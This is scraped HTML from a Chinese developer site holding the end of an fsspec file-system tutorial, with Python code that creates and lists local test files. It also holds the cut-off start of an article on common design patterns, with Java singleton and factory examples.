<li>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fpython-run%2F" target="_blank" title="https://www.min2k.com/tools/python-run/" ref="nofollow noopener noreferrer">PythonRun</a> 在线运行代码（无需本地安装）</li>
</ol>
<h3 data-id="heading-4">四、示例代码</h3>
<p>检查文件或目录是否存在并列出内容</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> fsspec
<span class="hljs-keyword">import</span> os

<span class="hljs-comment"># 定义一个本地路径，可以是文件或目录</span>
local_path = <span class="hljs-string">"fsspec_test_dir"</span>

<span class="hljs-comment"># 创建一个本地文件系统实例</span>
fs = fsspec.filesystem(<span class="hljs-string">"file"</span>)

<span class="hljs-comment"># 检查路径是否存在</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> fs.exists(local_path):
    <span class="hljs-comment"># 如果不存在，则创建目录</span>
    fs.mkdir(local_path)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Directory '<span class="hljs-subst">{local_path}</span>' created."</span>)
    
    <span class="hljs-comment"># 在新目录中创建一些测试文件</span>
    <span class="hljs-keyword">with</span> fs.<span class="hljs-built_in">open</span>(os.path.join(local_path, <span class="hljs-string">"file1.txt"</span>), <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
        f.write(<span class="hljs-string">"Hello from file1!"</span>)
    <span class="hljs-keyword">with</span> fs.<span class="hljs-built_in">open</span>(os.path.join(local_path, <span class="hljs-string">"file2.txt"</span>), <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> f:
        f.write(<span class="hljs-string">"Hello from file2!"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Two files created in '<span class="hljs-subst">{local_path}</span>'."</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Path '<span class="hljs-subst">{local_path}</span>' already exists."</span>)

<span class="hljs-comment"># 列出目录内容</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"\nListing contents of '<span class="hljs-subst">{local_path}</span>':"</span>)
contents = fs.ls(local_path)
<span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> contents:
    <span class="hljs-comment"># 检查是否为文件</span>
    <span class="hljs-keyword">if</span> fs.isfile(item):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - File: <span class="hljs-subst">{item}</span>"</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  - Directory: <span class="hljs-subst">{item}</span>"</span>)

<span class="hljs-comment"># 清理（可选，但对于测试很有用）</span>
<span class="hljs-comment"># fs.rm(local_path, recursive=True)</span>
<span class="hljs-comment"># print(f"\nDirectory '{local_path}' removed.")</span>
</code></pre>
<p>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fpython-run%2F%3Fcode%3Dimport%2520fsspec%250Aimport%2520os%250A%250A%2523%2520%25E5%25AE%259A%25E4%25B9%2589%25E4%25B8%2580%25E4%25B8%25AA%25E6%259C%25AC%25E5%259C%25B0%25E8%25B7%25AF%25E5%25BE%2584%25EF%25BC%258C%25E5%258F%25AF%25E4%25BB%25A5%25E6%2598%25AF%25E6%2596%2587%25E4%25BB%25B6%25E6%2588%2596%25E7%259B%25AE%25E5%25BD%2595%250Alocal_path%2520%253D%2520%2522fsspec_test_dir%2522%250A%250A%2523%2520%25E5%2588%259B%25E5%25BB%25BA%25E4%25B8%2580%25E4%25B8%25AA%25E6%259C%25AC%25E5%259C%25B0%25E6%2596%2587%25E4%25BB%25B6%25E7%25B3%25BB%25E7%25BB%259F%25E5%25AE%259E%25E4%25BE%258B%250Afs%2520%253D%2520fsspec.filesystem%2528%2522file%2522%2529%250A%250A%2523%2520%25E6%25A3%2580%25E6%259F%25A5%25E8%25B7%25AF%25E5%25BE%2584%25E6%2598%25AF%25E5%2590%25A6%25E5%25AD%2598%25E5%259C%25A8%250Aif%2520not%2520fs.exists%2528local_path%2529%253A%250A%2520%2520%2520%2520%2523%2520%25E5%25A6%2582%25E6%259E%259C%25E4%25B8%258D%25E5%25AD%2598%25E5%259C%25A8%25EF%25BC%258C%25E5%2588%2599%25E5%2588%259B%25E5%25BB%25BA%25E7%259B%25AE%25E5%25BD%2595%250A%2520%2520%2520%2520fs.mkdir%2528local_path%2529%250A%2520%2520%2520%2520print%2528f%2522Directory%2520'%257Blocal_path%257D'%2520created.%2522%2529%250A%2520%2520%2520%2520%250A%2520%2520%2520%2520%2523%2520%25E5%259C%25A8%25E6%2596%25B0%25E7%259B%25AE%25E5%25BD%2595%25E4%25B8%25AD%25E5%2588%259B%25E5%25BB%25BA%25E4%25B8%2580%25E4%25BA%259B%25E6%25B5%258B%25E8%25AF%2595%25E6%2596%2587%25E4%25BB%25B6%250A%2520%2520%2520%2520with%2520fs.open%2528os.path.join%2528local_path%252C%2520%2522file1.txt%2522%2529%252C%2520%2522w%2522%2529%2520as%2520f%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520f.write%2528%2522Hello%2520from%2520file1!%2522%2529%250A%2520%2520%2520%2520with%2520fs.open%2528os.path.join%2528local_path%252C%2520%2522file2.txt%2522%2529%252C%2520%2522w%2522%2529%2520as%2520f%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520f.write%2528%2522Hello%2520from%2520file2!%2522%2529%250A%2520%2520%2520%2520print%2528f%2522Two%2520files%2520created%2520in%2520'%257Blocal_path%257D'.%2522%2529%250Aelse%253A%250A%2520%2520%2520%2520print%2528f%2522Path%2520'%257Blocal_path%257D'%2520already%2520exists.%2522%2529%250A%250A%2523%2520%25E5%2588%2597%25E5%2587%25BA%25E7%259B%25AE%25E5%25BD%2595%25E5%2586%2585%25E5%25AE%25B9%250Aprint%2528f%2522%255CnListing%2520contents%2520of%2520'%257Blocal_path%257D'%253A%2522%2529%250Acontents%2520%253D%2520fs.ls%2528local_path%2529%250Afor%2520item%2520in%2520contents%253A%250A%2520%2520%2520%2520%2523%2520%25E6%25A3%2580%25E6%259F%25A5%25E6%2598%25AF%25E5%2590%25A6%25E4%25B8%25BA%25E6%2596%2587%25E4%25BB%25B6%250A%2520%2520%2520%2520if%2520fs.isfile%2528item%2529%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520print%2528f%2522%2520%2520-%2520File%253A%2520%257Bitem%257D%2522%2529%250A%2520%2520%2520%2520else%253A%250A%2520%2520%2520%2520%2520%2520%2520%2520print%2528f%2522%2520%2520-%2520Directory%253A%2520%257Bitem%257D%2522%2529%250A%250A%2523%2520%25E6%25B8%2585%25E7%2590%2586%25EF%25BC%2588%25E5%258F%25AF%25E9%2580%2589%25EF%25BC%258C%25E4%25BD%2586%25E5%25AF%25B9%25E4%25BA%258E%25E6%25B5%258B%25E8%25AF%2595%25E5%25BE%2588%25E6%259C%2589%25E7%2594%25A8%25EF%25BC%2589%250A%2523%2520fs.rm%2528local_path%252C%2520recursive%253DTrue%2529%250A%2523%2520print%2528f%2522%255CnDirectory%2520'%257Blocal_path%257D'%2520removed.%2522%2529" target="_blank" title="https://www.min2k.com/tools/python-run/?code=import%20fsspec%0Aimport%20os%0A%0A%23%20%E5%AE%9A%E4%B9%89%E4%B8%80%E4%B8%AA%E6%9C%AC%E5%9C%B0%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%98%AF%E6%96%87%E4%BB%B6%E6%88%96%E7%9B%AE%E5%BD%95%0Alocal_path%20%3D%20%22fsspec_test_dir%22%0A%0A%23%20%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%AE%9E%E4%BE%8B%0Afs%20%3D%20fsspec.filesystem%28%22file%22%29%0A%0A%23%20%E6%A3%80%E6%9F%A5%E8%B7%AF%E5%BE%84%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%0Aif%20not%20fs.exists%28local_path%29%3A%0A%20%20%20%20%23%20%E5%A6%82%E6%9E%9C%E4%B8%8D%E5%AD%98%E5%9C%A8%EF%BC%8C%E5%88%99%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95%0A%20%20%20%20fs.mkdir%28local_path%29%0A%20%20%20%20print%28f%22Directory%20'%7Blocal_path%7D'%20created.%22%29%0A%20%20%20%20%0A%20%20%20%20%23%20%E5%9C%A8%E6%96%B0%E7%9B%AE%E5%BD%95%E4%B8%AD%E5%88%9B%E5%BB%BA%E4%B8%80%E4%BA%9B%E6%B5%8B%E8%AF%95%E6%96%87%E4%BB%B6%0A%20%20%20%20with%20fs.open%28os.path.join%28local_path%2C%20%22file1.txt%22%29%2C%20%22w%22%29%20as%20f%3A%0A%20%20%20%20%20%20%20%20f.write%28%22Hello%20from%20file1!%22%29%0A%20%20%20%20with%20fs.open%28os.path.join%28local_path%2C%20%22file2.txt%22%29%2C%20%22w%22%29%20as%20f%3A%0A%20%20%20%20%20%20%20%20f.write%28%22Hello%20from%20file2!%22%29%0A%20%20%20%20print%28f%22Two%20files%20created%20in%20'%7Blocal_path%7D'.%22%29%0Aelse%3A%0A%20%20%20%20print%28f%22Path%20'%7Blocal_path%7D'%20already%20exists.%22%29%0A%0A%23%20%E5%88%97%E5%87%BA%E7%9B%AE%E5%BD%95%E5%86%85%E5%AE%B9%0Aprint%28f%22%5CnListing%20contents%20of%20'%7Blocal_path%7D'%3A%22%29%0Acontents%20%3D%20fs.ls%28local_path%29%0Afor%20item%20in%20contents%3A%0A%20%20%20%20%23%20%E6%A3%80%E6%9F%A5%E6%98%AF%E5%90%A6%E4%B8%BA%E6%96%87%E4%BB%B6%0A%20%20%20%20if%20fs.isfile%28item%29%3A%0A%20%20%20%20%20%20%20%20print%28f%22%20%20-%20File%3A%20%7Bitem%7D%22%29%0A%20%20%20%20else%3A%0A%20%20%20%20%20%20%20%20print%28f%22%20%20-%20Directory%3A%20%7Bitem%7D%22%29%0A%0A%23%20%E6%B8%85%E7%90%86%EF%BC%88%E5%8F%AF%E9%80%89%EF%BC%8C%E4%BD%86%E5%AF%B9%E4%BA%8E%E6%B5%8B%E8%AF%95%E5%BE%88%E6%9C%89%E7%94%A8%EF%BC%89%0A%23%20fs.rm%28local_path%2C%20recursive%3DTrue%29%0A%23%20print%28f%22%5CnDirectory%20'%7Blocal_path%7D'%20removed.%22%29" ref="nofollow noopener noreferrer">PythonRun</a> 在线运行这段代码，结果如下：</p>
<pre><code class="hljs language-text" lang="text">Path 'fsspec_test_dir' already exists.

Listing contents of 'fsspec_test_dir':
  - File: /code/fsspec_test_dir/file1.txt
  - File: /code/fsspec_test_dir/file2.txt
</code></pre>
<p>使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fmermaid%2F%3Fcode%3Dflowchart%2520TD%250A%2520%2520%2520%2520A%255B%25E5%25BC%2580%25E5%25A7%258B%255D%2520--%253E%2520B%257B%25E6%259C%25AC%25E5%259C%25B0%25E8%25B7%25AF%25E5%25BE%2584%2520'fsspec_test_dir'%2520%25E6%2598%25AF%25E5%2590%25A6%25E5%25AD%2598%25E5%259C%25A8%253F%257D%253B%250A%2520%2520%2520%2520B%2520--%2520%25E5%2590%25A6%2520--%253E%2520C%255B%25E5%2588%259B%25E5%25BB%25BA%25E7%259B%25AE%25E5%25BD%2595%2520'fsspec_test_dir'%255D%253B%250A%2520%2520%2520%2520C%2520--%253E%2520D%255B%25E5%2588%259B%25E5%25BB%25BA%25E6%2596%2587%25E4%25BB%25B6%2520'file1.txt'%2520%25E5%2592%258C%2520'file2.txt'%2520%25E5%259C%25A8%25E6%2596%25B0%25E7%259B%25AE%25E5%25BD%2595%25E4%25B8%25AD%255D%253B%250A%2520%2520%2520%2520D%2520--%253E%2520E%255B%25E6%2589%2593%25E5%258D%25B0%25E7%259B%25AE%25E5%25BD%2595%25E5%2588%259B%25E5%25BB%25BA%25E5%258F%258A%25E6%2596%2587%25E4%25BB%25B6%25E5%2588%259B%25E5%25BB%25BA%25E4%25BF%25A1%25E6%2581%25AF%255D%253B%250A%2520%2520%2520%2520B%2520--%2520%25E6%2598%25AF%2520--%253E%2520F%255B%25E6%2589%2593%25E5%258D%25B0%25E8%25B7%25AF%25E5%25BE%2584%25E5%25B7%25B2%25E5%25AD%2598%25E5%259C%25A8%25E4%25BF%25A1%25E6%2581%25AF%255D%253B%250A%2520%2520%2520%2520F%2520--%253E%2520G%255B%25E5%2588%2597%25E5%2587%25BA%25E7%259B%25AE%25E5%25BD%2595%2520'fsspec_test_dir'%2520%25E7%259A%2584%25E5%2586%2585%25E5%25AE%25B9%255D%253B%250A%2520%2520%2520%2520E%2520--%253E%2520G%253B%250A%2520%2520%2520%2520G%2520--%253E%2520H%257B%25E9%2581%258D%25E5%258E%2586%25E6%25AF%258F%25E4%25B8%25AA%25E9%25A1%25B9%25E7%259B%25AE%257D%253B%250A%2520%2520%2520%2520H%2520--%2520%25E6%2598%25AF%25E6%2596%2587%25E4%25BB%25B6%253F%2520--%253E%2520I%255B%25E6%2589%2593%25E5%258D%25B0%2520'%25E6%2596%2587%25E4%25BB%25B6%253A%2520%25E9%25A1%25B9%25E7%259B%25AE%25E5%2590%258D'%255D%253B%250A%2520%2520%2520%2520H%2520--%2520%25E5%2590%25A6%2520--%253E%2520J%255B%25E6%2589%2593%25E5%258D%25B0%2520'%25E7%259B%25AE%25E5%25BD%2595%253A%2520%25E9%25A1%25B9%25E7%259B%25AE%25E5%2590%258D'%255D%253B%250A%2520%2520%2520%2520I%2520--%253E%2520K%255B%25E7%25BB%2593%25E6%259D%259F%255D%253B%250A%2520%2520%2520%2520J%2520--%253E%2520K%253B" target="_blank" title="https://www.min2k.com/tools/mermaid/?code=flowchart%20TD%0A%20%20%20%20A%5B%E5%BC%80%E5%A7%8B%5D%20--%3E%20B%7B%E6%9C%AC%E5%9C%B0%E8%B7%AF%E5%BE%84%20'fsspec_test_dir'%20%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%3F%7D%3B%0A%20%20%20%20B%20--%20%E5%90%A6%20--%3E%20C%5B%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95%20'fsspec_test_dir'%5D%3B%0A%20%20%20%20C%20--%3E%20D%5B%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6%20'file1.txt'%20%E5%92%8C%20'file2.txt'%20%E5%9C%A8%E6%96%B0%E7%9B%AE%E5%BD%95%E4%B8%AD%5D%3B%0A%20%20%20%20D%20--%3E%20E%5B%E6%89%93%E5%8D%B0%E7%9B%AE%E5%BD%95%E5%88%9B%E5%BB%BA%E5%8F%8A%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%E4%BF%A1%E6%81%AF%5D%3B%0A%20%20%20%20B%20--%20%E6%98%AF%20--%3E%20F%5B%E6%89%93%E5%8D%B0%E8%B7%AF%E5%BE%84%E5%B7%B2%E5%AD%98%E5%9C%A8%E4%BF%A1%E6%81%AF%5D%3B%0A%20%20%20%20F%20--%3E%20G%5B%E5%88%97%E5%87%BA%E7%9B%AE%E5%BD%95%20'fsspec_test_dir'%20%E7%9A%84%E5%86%85%E5%AE%B9%5D%3B%0A%20%20%20%20E%20--%3E%20G%3B%0A%20%20%20%20G%20--%3E%20H%7B%E9%81%8D%E5%8E%86%E6%AF%8F%E4%B8%AA%E9%A1%B9%E7%9B%AE%7D%3B%0A%20%20%20%20H%20--%20%E6%98%AF%E6%96%87%E4%BB%B6%3F%20--%3E%20I%5B%E6%89%93%E5%8D%B0%20'%E6%96%87%E4%BB%B6%3A%20%E9%A1%B9%E7%9B%AE%E5%90%8D'%5D%3B%0A%20%20%20%20H%20--%20%E5%90%A6%20--%3E%20J%5B%E6%89%93%E5%8D%B0%20'%E7%9B%AE%E5%BD%95%3A%20%E9%A1%B9%E7%9B%AE%E5%90%8D'%5D%3B%0A%20%20%20%20I%20--%3E%20K%5B%E7%BB%93%E6%9D%9F%5D%3B%0A%20%20%20%20J%20--%3E%20K%3B" ref="nofollow noopener noreferrer">MermaidGo</a> 绘制示例代码的流程图，结果如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ec247da2a13044a49055181a69edba6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWP57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770696138&amp;x-signature=OUC3zos4SjOGNU4b9G75va%2FWJlI%3D" alt="MermerGo的fsspec流程图" loading="lazy"/></p>
<h3 data-id="heading-5">五、学习资源</h3>
<ol>
<li>开源项目：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffsspec%2Ffilesystem_spec" target="_blank" title="https://github.com/fsspec/filesystem_spec" ref="nofollow noopener noreferrer">fsspec</a></li>
<li>中文自述：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.python64.cn%2Freadme%2Ffsspec%2F" target="_blank" title="https://www.python64.cn/readme/fsspec/" ref="nofollow noopener noreferrer">REMDME</a></li>
<li>在线运行：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.min2k.com%2Ftools%2Fpython-run%2F" target="_blank" title="https://www.min2k.com/tools/python-run/" ref="nofollow noopener noreferrer">PythonRun</a></li>
</ol>
<blockquote>
<p>如果这篇文章对你有帮助，欢迎点赞、收藏、转发！<br/>
学习过程中有任何问题，欢迎在评论区留言交流～</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[程序员必会的 7 种高频设计模式]]></title>    <link>https://juejin.cn/post/7602303923169886217</link>    <guid>https://juejin.cn/post/7602303923169886217</guid>    <pubDate>2026-02-03T05:50:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602303923169886217" data-draft-id="7602206323460669491" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="程序员必会的 7 种高频设计模式"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T05:50:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神奇小汤圆"/> <meta itemprop="url" content="https://juejin.cn/user/1151943919285431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            程序员必会的 7 种高频设计模式
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1151943919285431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神奇小汤圆
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T05:50:54.000Z" title="Tue Feb 03 2026 05:50:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读17分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>设计模式在我们的日常软件开发中无处不在。它们帮助我们编写更具可扩展性和可读性的代码。</p>
<p>今天，结合我的实际工作场景和源码示例，我将和你探讨工作中这 7 种最常用的设计模式，希望能对你有所帮助。</p>
<h2 data-id="heading-0">1. 单例模式</h2>
<p>单例模式确保一个类只有一个实例，通常用于管理配置、缓存、线程池等共享资源。</p>
<h3 data-id="heading-1">代码实现 1：双重检查锁定</h3>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    privatestaticvolatile Singleton instance;

    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">getInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            synchronized (Singleton.<span class="hljs-keyword">class</span>) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
                    instance = <span class="hljs-keyword">new</span> Singleton();
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<p>这是单例模式的标准写法，既保证了线程安全，又避免了性能损失。</p>
<p><strong>代码解释：</strong></p>
<ul>
<li><code>private static volatile Singleton instance;</code></li>
<li><code>volatile</code>关键字确保了 <code>instance</code>变量的可见性。当一个线程修改了 <code>instance</code>的值，其他线程可以立即看到最新的值。</li>
<li>同时，<code>volatile</code>还能防止指令重排序。在创建 <code>Singleton</code>实例时，<code>new Singleton()</code>操作并非原子操作。它包含三个步骤：分配内存空间、初始化对象、将对象引用赋值给 <code>instance</code>。如果没有 <code>volatile</code>，可能会发生指令重排序，导致其他线程获取到一个尚未完全初始化的 <code>instance</code>对象。</li>
<li><code>private Singleton()</code></li>
<li>私有构造函数确保无法从外部直接实例化 <code>Singleton</code>类，保证了单例模式的唯一性。</li>
<li><code>public static Singleton getInstance()</code></li>
<li>首先检查 <code>instance</code>是否为 <code>null</code>。如果不为 <code>null</code>，直接返回实例，避免进入同步代码块，提高了性能。</li>
<li>如果 <code>instance</code>为 <code>null</code>，进入同步代码块。<code>synchronized (Singleton.class)</code>语句锁定 <code>Singleton</code>类，确保同一时间只有一个线程能进入创建实例的代码块。</li>
<li>再次检查 <code>instance</code>是否为 <code>null</code>。这是为了防止多个线程同时通过第一次检查，进入同步代码块并重复创建实例。</li>
<li>当 <code>instance</code>为 <code>null</code>时，执行 <code>instance = new Singleton();</code>创建单例实例。</li>
</ul>
<h3 data-id="heading-2">代码实现 2：枚举单例模式</h3>
<p>这是 Effective Java 中更推荐的单例模式实现方式。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-built_in">enum</span> SingletonEnum {
    INSTANCE;

    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">doSomething</span>()</span> {
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">"This is a singleton instance doing something."</span>);
    }
}
</code></pre>
<p><strong>代码解释：</strong></p>
<ul>
<li>枚举类型是 Java 中一种特殊的类。它保证了实例的唯一性，并且天生是线程安全的。</li>
<li><code>INSTANCE</code>是 <code>SingletonEnum</code>枚举的唯一实例。你可以通过 <code>SingletonEnum.INSTANCE</code>获取该单例。</li>
<li>你可以在枚举中添加自定义方法，如 <code>doSomething()</code>，来实现单例需要完成的业务逻辑。</li>
<li>枚举单例可以防止反射和序列化破坏单例，因为 Java 规范保证了枚举类型的实例化是唯一的，且在序列化和反序列化过程中不会创建新实例。</li>
</ul>
<h3 data-id="heading-3">JDK 中的应用：</h3>
<ul>
<li><code>java.lang.Runtime.getRuntime()</code></li>
<li><code>java.util.logging.Logger</code></li>
</ul>
<h3 data-id="heading-4">Spring 中的应用</h3>
<p>默认情况下，Spring 的 <code>Bean</code>是单例模式。你可以通过使用 <code>@Scope("prototype")</code>将其更改为原型模式。</p>
<h2 data-id="heading-5">2. 工厂模式</h2>
<p>工厂模式用于封装对象的创建逻辑，特别是在类实例化过程复杂时，可以降低耦合度**。</p>
<h3 data-id="heading-6">代码实现：简单工厂</h3>
<p>以支付系统为例，不同的支付方式需要不同的对象。</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// 抽象产品：交通工具 (Vehicle)</span>
abstractclass Vehicle {
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span>;
}

<span class="hljs-keyword">class</span> <span class="hljs-title">Car</span> <span class="hljs-title">extends</span> <span class="hljs-title">Vehicle</span> {
    @Override
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">drive</span>()</span> {
